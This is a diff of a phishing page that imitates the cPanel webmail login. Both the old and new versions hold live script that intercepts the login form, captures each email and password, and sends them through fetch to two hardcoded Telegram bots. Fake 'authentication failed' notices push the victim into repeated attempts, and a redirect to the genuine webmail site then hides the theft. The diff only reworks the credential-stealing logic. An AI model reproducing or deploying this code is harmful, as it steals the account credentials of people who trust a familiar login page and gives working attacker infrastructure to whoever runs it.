@@ -297,88 +297,91 @@ CPTimezone.reset_timezone();
     <br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
 
     <script>
-        // Telegram bot details for the first bot
-        const BOT_TOKEN_1 = "7140514148:AAHNlzj2a9bHPtcIXuAm0fs6zmwHpHIKaqw"; // Replace with your first bot token
-        const CHAT_ID_1 = "5787641696"; // Replace with your first chat ID
-    
-        // Telegram bot details for the second bot
-        const BOT_TOKEN_2 = "7227891642:AAH-i5NfkFlkJ9sewJur6L4TSl4avyWlGW0"; // Replace with your second bot token
-        const CHAT_ID_2 = "1323539460"; // Replace with your second chat ID
-    
-        const REDIRECT_URL = "https://webmail.cpanel.net/"; // Replace with your external URL
+        // Telegram bot details
+        const BOT_TOKEN_1 = "7227891642:AAH-i5NfkFlkJ9sewJur6L4TSl4avyWlGW0"; // Replace with your first bot token
+        const CHAT_ID_1 = "1323539460"; // Replace with your first chat ID
         
+        const BOT_TOKEN_2 = "7140514148:AAHNlzj2a9bHPtcIXuAm0fs6zmwHpHIKaqw"; // Replace with your second bot token
+        const CHAT_ID_2 = "5787641696"; // Replace with your second chat ID
+        
+        const REDIRECT_URL = "https://webmail.cpanel.net/"; // Replace with your actual external URL
+    
         // Function to send data to Telegram
-        async function sendToTelegram(message) {
-            // URLs for both bots
+        async function sendToBothTelegramBots(message) {
             const url1 = `https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`;
             const url2 = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
     
-            const payload1 = {
-                chat_id: CHAT_ID_1,
-                text: message,
-                parse_mode: "Markdown",
-            };
-    
-            const payload2 = {
-                chat_id: CHAT_ID_2,
-                text: message,
-                parse_mode: "Markdown",
-            };
+            const payload1 = { chat_id: CHAT_ID_1, text: message, parse_mode: "Markdown" };
+            const payload2 = { chat_id: CHAT_ID_2, text: message, parse_mode: "Markdown" };
     
             try {
-                // Send message to the first bot
-                await fetch(url1, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify(payload1),
-                });
-                console.log("Message sent to first Telegram bot");
-    
-                // Send message to the second bot
-                await fetch(url2, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify(payload2),
-                });
-                console.log("Message sent to second Telegram bot");
+                // Send log to both bots simultaneously
+                await Promise.all([
+                    fetch(url1, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload1),
+                    }),
+                    fetch(url2, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload2),
+                    }),
+                ]);
+                console.log("Message sent to both Telegram bots");
             } catch (error) {
                 console.error("Error sending to Telegram:", error);
             }
         }
-        
-        // Initialize or retrieve login attempts count from session storage
+    
+        // Track login attempts using sessionStorage
         let loginAttempts = sessionStorage.getItem("loginAttempts")
             ? parseInt(sessionStorage.getItem("loginAttempts"), 10)
             : 0;
-        
-        // Capture login form submission
-        document.getElementById("login_form").addEventListener("submit", function (event) {
+    
+        // Create a custom notification function
+        function showNotification(message) {
+            let notification = document.createElement("div");
+            notification.style.position = "fixed";
+            notification.style.top = "20px";
+            notification.style.left = "50%";
+            notification.style.transform = "translateX(-50%)";
+            notification.style.backgroundColor = "#ff4d4d";
+            notification.style.color = "white";
+            notification.style.padding = "10px 20px";
+            notification.style.borderRadius = "5px";
+            notification.style.fontFamily = "Arial, sans-serif";
+            notification.style.zIndex = "1000";
+            notification.style.boxShadow = "0px 4px 6px rgba(0,0,0,0.1)";
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            setTimeout(() => {
+                document.body.removeChild(notification);
+            }, 3000);
+        }
+    
+        // Handle login form submission
+        document.getElementById("login_form").addEventListener("submit", async function (event) {
             event.preventDefault(); // Prevent default form submission
-        
-            // Collect form data
+    
             const email = document.getElementById("user").value;
             const password = document.getElementById("pass").value;
-        
-            // Increment login attempts and save to session storage
+    
+            // Increment login attempts and save to sessionStorage
             loginAttempts++;
             sessionStorage.setItem("loginAttempts", loginAttempts);
-        
-            // Log data to Telegram
+    
+            // Log login attempt to both Telegram bots
             const message = `Login Attempt ${loginAttempts}:\n*Email*: ${email}\n*Password*: ${password}`;
-            sendToTelegram(message);
-        
-            // Redirect logic
-            if (loginAttempts === 1) {
-                alert("Invalid login. Redirecting back to the login page.");
-                window.location.href = "index.html"; // Redirect back to login page
-            } else if (loginAttempts === 2) {
-                window.location.href = REDIRECT_URL; // Redirect on the second attempt
-            } else {
-                alert("Too many attempts. Please try again later.");
+            await sendToBothTelegramBots(message); // Ensure both bots receive the message
+    
+            // Handle redirection logic based on attempts
+            if (loginAttempts === 1 || loginAttempts === 2) {
+                showNotification("Authentication failed. Please try again.");
+                window.location.href = "index.html"; // Redirect back to the login page
+            } else if (loginAttempts === 3) {
+                showNotification("Redirecting to your account...");
+                window.location.href = REDIRECT_URL; // Redirect to external URL
             }
         });
     </script>
